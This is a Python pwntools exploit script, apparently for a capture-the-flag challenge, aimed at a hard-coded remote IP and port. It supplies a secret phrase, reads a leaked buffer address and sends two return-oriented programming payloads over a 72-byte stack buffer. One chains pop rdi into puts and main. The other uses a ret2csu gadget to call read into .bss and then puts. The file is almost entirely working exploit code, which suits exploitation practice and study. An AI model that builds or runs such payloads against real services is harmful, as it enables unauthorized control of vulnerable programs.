#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

# Test 1: pop_rdi -> known string -> puts -> main
payload = b'A' * 72
payload += p64(0x4011f2)     # pop rdi; ret
payload += p64(0x402041)     # "Let's celebrate Spooktober!!!"
payload += p64(0x401040)     # puts@plt
payload += p64(0x401393)     # main
r.send(payload)
try:
    data = r.recv(timeout=3)
    print(f'Test 1: {data[:300]}')
    if b'Spooktober' in data:
        print('pop_rdi + puts works!')
except Exception as e:
    print(f'Test 1 failed: {e}')
r.close()

# Test 2: CSU read(0, bss, 0x20) + puts(bss)
r2 = remote('154.57.164.77', 32702)
r2.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r2.recvuntil(b'[0x')
buf_leak2 = int(r2.recvuntil(b']')[:-1], 16)
print(f'buf_leak2: {hex(buf_leak2)}')
r2.recvuntil(b'wish for next year: ')

payload2 = b'A' * 72
payload2 += p64(0x401512)    # csu_pop
payload2 += p64(0) + p64(1) + p64(0) + p64(0x404040) + p64(0x20) + p64(0x403250)
payload2 += p64(0x4014f8)    # csu_call -> read(0, 0x404040, 0x20)
payload2 += p64(0) + p64(0)*6
payload2 += p64(0x4011f2)    # pop rdi
payload2 += p64(0x404040)
payload2 += p64(0x401040)    # puts
r2.send(payload2)
import time
time.sleep(0.3)
r2.send(b'CSU_TEST\n')
time.sleep(1)
try:
    data2 = r2.recv(timeout=3)
    print(f'Test 2: {data2[:300]}')
    if b'CSU_TEST' in data2:
        print('CSU read + puts works!')
except Exception as e:
    print(f'Test 2 failed: {e}')
r2.close()
